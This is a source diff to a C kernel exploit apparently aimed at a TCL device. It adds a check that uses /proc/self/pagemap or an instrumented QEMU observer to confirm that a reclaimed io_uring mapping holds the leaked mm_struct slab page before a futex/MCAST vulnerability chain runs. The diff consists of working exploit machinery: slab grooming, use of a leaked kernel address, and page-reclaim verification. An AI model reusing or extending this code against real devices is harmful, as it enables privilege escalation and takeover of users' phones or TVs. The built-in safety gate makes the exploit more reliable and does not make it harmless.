@@ -1,5 +1,6 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include "../devices/tcl_v643/capture_witness.h"
 #include "kernelsnitch/kernelsnitch.h"
 #include <linux/io_uring.h>
 
@@ -40,6 +41,9 @@ size_t uring_mapsz[URING_MAX];
 size_t uring_mapstride[URING_MAX];
 int uring_count = 0;
 long g_storm_block_start = -1;
+int g_tcl_capture_block = -1;
+int g_tcl_capture_status = TCL_CAPTURE_UNAVAILABLE;
+const char *g_tcl_capture_method = "none";
 extern uintptr_t g_init_user_ns_addr;
 
 uint8_t *uring_block(int idx) {
@@ -82,18 +86,29 @@ struct tcl_qemu_pid_mm_diag {
   uint64_t mm_kva, slab_pfn;
   uint32_t slab_order, object_offset;
 };
+struct tcl_qemu_va_pfn_diag {
+  uint64_t user_va, pfn;
+};
 #define TCL_QEMU_IOC_MAGIC 0x47
+#define TCL_QEMU_VA_TO_PFN_DIAG \
+  _IOWR(TCL_QEMU_IOC_MAGIC, 2, struct tcl_qemu_va_pfn_diag)
 #define TCL_QEMU_PID_MM_DIAG \
   _IOWR(TCL_QEMU_IOC_MAGIC, 4, struct tcl_qemu_pid_mm_diag)
+static uint64_t g_tcl_qemu_target_pfn = UINT64_MAX;
 static void tcl_qemu_leak_diag(pid_t pid) {
-  if (!env_flag("TCL_QEMU_OBSERVER_DIAG", 0)) return;
   int fd = open("/dev/glqemu-root", O_RDONLY);
   if (fd < 0) {
+    if (!env_flag("TCL_QEMU_OBSERVER_DIAG", 0)) return;
     pr_warning("TCL QEMU diag: observer open errno=%d\n", errno);
     return;
   }
   struct tcl_qemu_pid_mm_diag q = {.pid = pid};
   if (ioctl(fd, TCL_QEMU_PID_MM_DIAG, &q) == 0) {
+    g_tcl_qemu_target_pfn = q.slab_pfn & ~UINT64_C(3);
+    if (!env_flag("TCL_QEMU_OBSERVER_DIAG", 0)) {
+      close(fd);
+      return;
+    }
     pr_info("TCL QEMU diag only: true_mm=%016llx pfn=%llx order=%u off=%x\n",
             (unsigned long long)q.mm_kva,
             (unsigned long long)q.slab_pfn, q.slab_order, q.object_offset);
@@ -116,6 +131,100 @@ static void tcl_qemu_leak_diag(pid_t pid) {
 #else
 static void tcl_qemu_leak_diag(pid_t pid) { (void)pid; }
 #endif
+
+static int tcl_read_pagemap_head_pfn(int fd, const void *address,
+                                     uint64_t *head_pfn) {
+  if (fd < 0) return 0;
+  uint64_t entry = 0;
+  off_t off = (off_t)(((uintptr_t)address >> PAGE_SHIFT) * sizeof(entry));
+  ssize_t got = pread(fd, &entry, sizeof(entry), off);
+  if (got != (ssize_t)sizeof(entry))
+    return 0;
+  return tcl_pagemap_decode_pfn(entry, MM_ORDER, head_pfn);
+}
+
+int tcl_pagemap_pfn_preflight(uint64_t *head_pfn) {
+  uint8_t *page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (page == MAP_FAILED)
+    return 0;
+  page[0] = 0x5a; /* fault in a private page; no external state is changed */
+  int fd = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
+  uint64_t pfn = 0;
+  int visible = tcl_read_pagemap_head_pfn(fd, page, &pfn);
+  if (fd >= 0) close(fd);
+  munmap(page, PAGE_SIZE);
+  if (visible && head_pfn) *head_pfn = pfn;
+  return visible;
+}
+
+/* Prove that one, and only one, tracked io_uring mapping owns the leaked
+ * mm_struct slab.  The QEMU observer is used only in the instrumented VM.
+ * On a real device the standard pagemap ABI is attempted; modern kernels
+ * normally mask PFNs for the shell, in which case the verdict is UNKNOWN and
+ * the exploit stops before creating the vulnerable futex/MCAST chain. */
+static int tcl_capture_witness(uintptr_t slab_kva) {
+  uint64_t target_pfn = tcl_target_head_pfn(
+      slab_kva, active_offsets->page_offset, active_offsets->phys_offset,
+      MM_ORDER);
+  int observer = -1;
+  int pagemap = -1;
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+  if (g_tcl_qemu_target_pfn != UINT64_MAX) {
+    observer = open("/dev/glqemu-root", O_RDONLY | O_CLOEXEC);
+    if (observer >= 0)
+      target_pfn = g_tcl_qemu_target_pfn;
+  }
+#endif
+  if (observer < 0)
+    pagemap = open("/proc/self/pagemap", O_RDONLY | O_CLOEXEC);
+  unsigned visible = 0, hits = 0;
+  unsigned total = 0;
+  int hit_block = -1;
+  for (int block = 0;; block++) {
+    uint8_t *page = uring_block(block);
+    if (!page)
+      break;
+    total++;
+    uint64_t pfn = UINT64_MAX;
+    int have_pfn = 0;
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+    if (observer >= 0) {
+      struct tcl_qemu_va_pfn_diag q = {.user_va = (uintptr_t)page};
+      if (ioctl(observer, TCL_QEMU_VA_TO_PFN_DIAG, &q) == 0) {
+        pfn = q.pfn & ~UINT64_C(3);
+        have_pfn = 1;
+      }
+    }
+#endif
+    if (!have_pfn)
+      have_pfn = tcl_read_pagemap_head_pfn(pagemap, page, &pfn);
+    if (!have_pfn)
+      continue;
+    visible++;
+    if (pfn == target_pfn) {
+      hits++;
+      hit_block = block;
+    }
+  }
+  if (observer >= 0) {
+    close(observer);
+    g_tcl_capture_method = "qemu-observer";
+  } else {
+    if (pagemap >= 0) close(pagemap);
+    g_tcl_capture_method = "pagemap";
+  }
+  if (target_pfn == UINT64_MAX)
+    visible = 0;
+  g_tcl_capture_status = tcl_capture_verdict(total, visible, hits);
+  g_tcl_capture_block =
+      g_tcl_capture_status == TCL_CAPTURE_CONFIRMED ? hit_block : -1;
+  pr_info("TCL capture witness: method=%s visible=%u/%u hits=%u block=%d "
+          "target_pfn=%llx verdict=%d\n",
+          g_tcl_capture_method, visible, total, hits, g_tcl_capture_block,
+          (unsigned long long)target_pfn, g_tcl_capture_status);
+  return g_tcl_capture_status == TCL_CAPTURE_CONFIRMED;
+}
 
 uintptr_t page_base;
 uintptr_t last_mm_struct;
@@ -1240,6 +1349,12 @@ static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
   free(skb_buf);
   skb_buf = NULL;
   g_skb_reclaim = 0;
+  g_tcl_capture_block = -1;
+  g_tcl_capture_status = TCL_CAPTURE_UNAVAILABLE;
+  g_tcl_capture_method = "none";
+#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
+  g_tcl_qemu_target_pfn = UINT64_MAX;
+#endif
   pin_to_core(CORE);
   mm_objs_per_slab = MM_SLAB_SIZE / MM_STRUCT_SZ;
   if (mm_objs_per_slab != 16) {
@@ -1324,6 +1439,11 @@ static uintptr_t prepare_kernel_page_tcl(int payload_mode) {
     size_t pos = target_window_end + 1 + (size_t)(drain - 1) * 16;
     if (!tcl_release_mm_position(pos)) goto fail;
     if (!reclaim_one_uring(6000 + drain)) goto fail;
+  }
+  if (!tcl_capture_witness(base)) {
+    pr_error("TCL reclaim: capture is not proven; refusing the dangerous route\n");
+    errno = ENODATA;
+    goto fail;
   }
   kernelsnitch_cleanup(ks);
   ks = NULL;
